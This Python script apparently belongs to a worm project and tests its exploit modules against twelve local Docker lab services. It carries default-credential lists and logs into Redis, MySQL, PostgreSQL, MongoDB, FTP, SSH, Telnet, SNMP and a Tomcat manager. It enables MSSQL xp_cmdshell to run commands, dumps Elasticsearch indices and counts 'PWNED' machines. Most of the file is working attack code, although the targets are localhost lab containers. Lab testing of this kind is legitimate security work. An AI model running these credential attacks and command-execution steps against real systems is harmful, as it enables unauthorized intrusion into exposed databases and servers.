#!/usr/bin/env python3
"""
Wormy Docker Lab — Full Exploitation Test
Tests the worm's exploit modules against all Docker lab services.
"""

import json
import os
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from rich.console import Console

console = Console()

# Lab targets with correct credentials
LAB_TARGETS = [
    {
        "name": "Redis",
        "ip": "127.0.0.1",
        "port": 6379,
        "open_ports": [6379],
        "os_guess": "Linux",
        "creds": [("", "redis123"), ("default", "redis123"), ("", "")],
    },
    {
        "name": "Redis-NoAuth",
        "ip": "127.0.0.1",
        "port": 6380,
        "open_ports": [6379],
        "os_guess": "Linux",
        "creds": [("", "")],
    },
    {
        "name": "MySQL",
        "ip": "127.0.0.1",
        "port": 3306,
        "open_ports": [3306],
        "os_guess": "Linux",
        "creds": [("root", "root")],
    },
    {
        "name": "PostgreSQL",
        "ip": "127.0.0.1",
        "port": 5432,
        "open_ports": [5432],
        "os_guess": "Linux",
        "creds": [("admin", "admin123")],
    },
    {
        "name": "MongoDB",
        "ip": "127.0.0.1",
        "port": 27017,
        "open_ports": [27017],
        "os_guess": "Linux",
        "creds": [("admin", "admin123")],
    },
    {
        "name": "MSSQL",
        "ip": "127.0.0.1",
        "port": 1433,
        "open_ports": [1433],
        "os_guess": "Linux",
        "creds": [("sa", "SqlPassword123!")],
    },
    {
        "name": "Elasticsearch",
        "ip": "127.0.0.1",
        "port": 9200,
        "open_ports": [9200],
        "os_guess": "Linux",
        "creds": [("", "")],
    },
    {
        "name": "FTP",
        "ip": "127.0.0.1",
        "port": 21,
        "open_ports": [21],
        "os_guess": "Linux",
        "creds": [("anonymous", "anonymous"), ("ftpuser", "ftpuser")],
    },
    {
        "name": "SSH",
        "ip": "127.0.0.1",
        "port": 2222,
        "open_ports": [22, 2222],
        "os_guess": "Linux",
        "creds": [("admin", "password")],
    },
    {
        "name": "Telnet",
        "ip": "127.0.0.1",
        "port": 8023,
        "open_ports": [23, 8023],
        "os_guess": "Linux",
        "creds": [("admin", "admin"), ("", "")],
    },
    {
        "name": "SNMP",
        "ip": "127.0.0.1",
        "port": 161,
        "open_ports": [161],
        "os_guess": "Linux",
        "creds": [("public", "public")],
    },
    {
        "name": "Tomcat",
        "ip": "127.0.0.1",
        "port": 8080,
        "open_ports": [8080],
        "os_guess": "Linux",
        "creds": [("admin", "admin")],
    },
]


def check_port(ip, port, proto="tcp"):
    """Check if a port is open"""
    try:
        if proto == "udp":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.close()
            return True
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            rc = s.connect_ex((ip, port))
            s.close()
            return rc == 0
    except Exception:
        return False


def test_redis(target):
    """Test Redis exploitation"""
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target["ip"], target["port"]))
        s.sendall(b"PING\r\n")
        resp = s.recv(64)
        if b"+PONG" in resp:
            s.sendall(b"INFO server\r\n")
            info = s.recv(512)
            s.close()
            return True, f"NoAuth PONG | {info.decode(errors='replace')[:50]}"
        s.close()
        # Try AUTH with all provided passwords
        passwords = ["redis123", ""]
        for user, pwd in target.get("creds", [("", "")]):
            if pwd not in passwords:
                passwords.append(pwd)
        for pwd in passwords:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target["ip"], target["port"]))
            cmd = f"AUTH {pwd}\r\n".encode() if pwd else b"PING\r\n"
            s.sendall(cmd)
            r = s.recv(64)
            if b"+OK" in r or b"+PONG" in r:
                s.close()
                return True, f"AUTH '{pwd}' OK"
            s.close()
        return False, "All auth attempts failed"
    except Exception as e:
        return False, str(e)


def test_mysql(target):
    """Test MySQL exploitation"""
    try:
        import pymysql

        for user, pwd in target.get("creds", []):
            try:
                c = pymysql.connect(
                    host=target["ip"],
                    port=target["port"],
                    user=user,
                    password=pwd,
                    connect_timeout=5,
                )
                cur = c.cursor()
                cur.execute("SELECT VERSION()")
                ver = cur.fetchone()[0]
                c.close()
                return True, f"{user}:{pwd} -> {ver}"
            except Exception:
                continue
        return False, "All credentials failed"
    except ImportError:
        return False, "pymysql not installed"


def test_postgresql(target):
    """Test PostgreSQL exploitation"""
    try:
        import psycopg2

        for user, pwd in target.get("creds", []):
            for dbname in ("testdb", "postgres"):
                try:
                    c = psycopg2.connect(
                        host=target["ip"],
                        port=target["port"],
                        user=user,
                        password=pwd,
                        dbname=dbname,
                        connect_timeout=5,
                    )
                    cur = c.cursor()
                    cur.execute("SELECT version()")
                    ver = cur.fetchone()[0]
                    c.close()
                    return True, f"{user}:{pwd} -> {ver[:40]}"
                except Exception:
                    continue
        return False, "All credentials failed"
    except ImportError:
        return False, "psycopg2 not installed"


def test_mongodb(target):
    """Test MongoDB exploitation"""
    try:
        from pymongo import MongoClient

        for user, pwd in target.get("creds", []):
            try:
                if user:
                    uri = f"mongodb://{user}:{pwd}@{target['ip']}:{target['port']}/?authSource=admin&serverSelectionTimeoutMS=5000"
                else:
                    uri = f"mongodb://{target['ip']}:{target['port']}/?serverSelectionTimeoutMS=5000"
                c = MongoClient(uri, serverSelectionTimeoutMS=5000)
                dbs = c.list_database_names()
                c.close()
                return True, f"{user or 'noauth'}:{pwd or ''} -> {dbs[:3]}"
            except Exception:
                continue
        return False, "All credentials failed"
    except ImportError:
        return False, "pymongo not installed"


def test_mssql(target):
    """Test MSSQL exploitation"""
    try:
        import pymssql

        for user, pwd in target.get("creds", []):
            try:
                conn = pymssql.connect(
                    server=target["ip"],
                    user=user,
                    password=pwd,
                    port=target["port"],
                    timeout=5,
                    login_timeout=5,
                )
                cur = conn.cursor()
                cur.execute("SELECT @@VERSION")
                ver = cur.fetchone()[0][:50]
                # Try xp_cmdshell
                try:
                    cur.execute("EXEC sp_configure 'show advanced options',1; RECONFIGURE")
                    cur.execute("EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE")
                    cur.execute("EXEC xp_cmdshell 'whoami'")
                    who = cur.fetchone()
                    rce = f" | xp_cmdshell: {who[0] if who else 'enabled'}"
                except Exception:
                    rce = ""
                conn.close()
                return True, f"{user}:{pwd} -> {ver}{rce}"
            except Exception:
                continue
        return False, "All credentials failed"
    except ImportError:
        return False, "pymssql not installed"


def test_elasticsearch(target):
    """Test Elasticsearch exploitation"""
    try:
        import urllib.request

        with urllib.request.urlopen(f"http://{target['ip']}:{target['port']}/_cat/indices?v", timeout=5) as resp:
            body = resp.read().decode()
        return True, f"indices dumped ({len(body)} bytes)"
    except Exception as e:
        return False, str(e)


def test_ftp(target):
    """Test FTP exploitation"""
    try:
        import ftplib

        for user, pwd in target.get("creds", []):
            try:
                ftp = ftplib.FTP()
                ftp.connect(target["ip"], target["port"], timeout=5)
                ftp.login(user, pwd)
                files = []
                ftp.retrlines("LIST", lambda x: files.append(x))
                ftp.quit()
                return True, f"{user}:{pwd} -> {len(files)} files"
            except Exception:
                continue
        return False, "All credentials failed"
    except Exception as e:
        return False, str(e)


def test_ssh(target):
    """Test SSH exploitation"""
    try:
        import paramiko

        for user, pwd in target.get("creds", []):
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    target["ip"],
                    port=target["port"],
                    username=user,
                    password=pwd,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False,
                )
                stdin, stdout, stderr = client.exec_command("whoami && id")
                output = stdout.read().decode().strip()
                client.close()
                return True, f"{user}:{pwd} -> {output}"
            except paramiko.AuthenticationException:
                continue
        return False, "All credentials failed"
    except Exception as e:
        return False, str(e)


def test_telnet(target):
    """Test Telnet exploitation"""
    try:
        import telnetlib

        for user, pwd in target.get("creds", []):
            try:
                tn = telnetlib.Telnet(target["ip"], target["port"], timeout=5)
                tn.read_until(b"login: ", timeout=3)
                tn.write(f"{user}\n".encode())
                tn.read_until(b"Password: ", timeout=3)
                tn.write(f"{pwd}\n".encode())
                resp = tn.read_some()
                tn.close()
                if b"$" in resp or b"#" in resp or b">" in resp:
                    return True, f"{user}:{pwd} -> shell access"
            except Exception:
                continue
        return False, "All credentials failed"
    except Exception as e:
        return False, str(e)


def test_snmp(target):
    """Test SNMP exploitation"""
    try:
        import socket

        for user, pwd in target.get("creds", []):
            community = pwd.encode() if pwd else b"public"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            oid = bytes([0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00])
            comm_asn1 = bytes([0x04, len(community)]) + community
            varbind = bytes([0x30, len(oid) + 2, 0x05, 0x00]) + oid
            pdu_content = (
                b"\x02\x01\x7b"
                + b"\x02\x01\x00"
                + b"\x02\x01\x00"
                + bytes([0x30, len(varbind)])
                + varbind
            )
            pdu = bytes([0xA0, len(pdu_content)]) + pdu_content
            msg = bytes([0x30, 1 + len(comm_asn1) + len(pdu)]) + b"\x02\x01\x00" + comm_asn1 + pdu
            sock.sendto(msg, (target["ip"], target["port"]))
            resp, _ = sock.recvfrom(4096)
            sock.close()
            if community in resp:
                return True, f"community '{pwd or 'public'}' -> access granted"
        return False, "All communities rejected"
    except Exception as e:
        return False, str(e)


def test_tomcat(target):
    """Test Tomcat exploitation"""
    try:
        import urllib.request

        # Try manager HTML endpoint first
        for user, pwd in target.get("creds", []):
            try:
                import base64
                token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                req = urllib.request.Request(
                    f"http://{target['ip']}:{target['port']}/manager/html",
                    headers={"Authorization": f"Basic {token}"},
                )
                with urllib.request.urlopen(req, timeout=5) as resp:
                    return True, f"{user}:{pwd} -> manager access (HTTP {resp.status})"
            except Exception:
                continue

        # Fallback: check if Tomcat is responding at all
        req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/manager/index.jsp")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
            if "Tomcat" in body:
                return True, f"Tomcat manager JSP accessible (HTTP {resp.status})"

        # Final fallback: check root page
        req = urllib.request.Request(f"http://{target['ip']}:{target['port']}/")
        with urllib.request.urlopen(req, timeout=5) as resp:
            return True, f"Tomcat root accessible (HTTP {resp.status})"
    except Exception as e:
        return False, str(e)


# Map service names to test functions
TEST_FUNCTIONS = {
    "Redis": test_redis,
    "Redis-NoAuth": test_redis,
    "MySQL": test_mysql,
    "PostgreSQL": test_postgresql,
    "MongoDB": test_mongodb,
    "MSSQL": test_mssql,
    "Elasticsearch": test_elasticsearch,
    "FTP": test_ftp,
    "SSH": test_ssh,
    "Telnet": test_telnet,
    "SNMP": test_snmp,
    "Tomcat": test_tomcat,
}


def main():
    console.print("[bold green]═══ WORMY DOCKER LAB — FULL EXPLOITATION TEST ═══[/bold green]\n")

    results = {}
    total = len(LAB_TARGETS)
    pwned = 0
    reachable = 0

    for i, target in enumerate(LAB_TARGETS, 1):
        name = target["name"]
        console.print(f"[cyan][{i}/{total}] Testing {name}...[/cyan]")

        # Check port
        port_open = check_port(target["ip"], target["port"])
        if port_open:
            reachable += 1
            console.print(f"  Port {target['port']} OPEN")

            # Run exploit
            test_fn = TEST_FUNCTIONS.get(name)
            if test_fn:
                success, detail = test_fn(target)
                if success:
                    pwned += 1
                    console.print(f"  [bold green]✅ PWNED[/bold green]: {detail}")
                else:
                    console.print(f"  [yellow]⚠️ Exploit failed[/yellow]: {detail}")
                results[name] = {"reachable": True, "pwned": success, "detail": detail}
            else:
                console.print(f"  [dim]No test function[/dim]")
                results[name] = {"reachable": True, "pwned": False, "detail": "no test"}
        else:
            console.print(f"  [red]❌ Port {target['port']} CLOSED[/red]")
            results[name] = {"reachable": False, "pwned": False, "detail": "port closed"}

    # Summary
    console.print("\n[bold white]═══ RESULTS ═══[/bold white]")
    console.print(f"  Targets: {total}")
    console.print(f"  Reachable: [green]{reachable}[/green]")
    console.print(f"  Pwned: [bold green]{pwned}[/bold green]")
    console.print(f"  Success rate: [bold]{pwned/total*100:.1f}%[/bold]")

    if pwned == total:
        console.print("\n[bold green]🎉 ALL MACHINES COMPROMISED! 🎉[/bold green]")
    elif pwned >= reachable * 0.8:
        console.print(f"\n[bold green]✅ {pwned}/{reachable} reachable machines compromised[/bold green]")
    else:
        console.print(f"\n[yellow]⚠️ Only {pwned}/{reachable} reachable machines compromised[/yellow]")

    return pwned == total


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
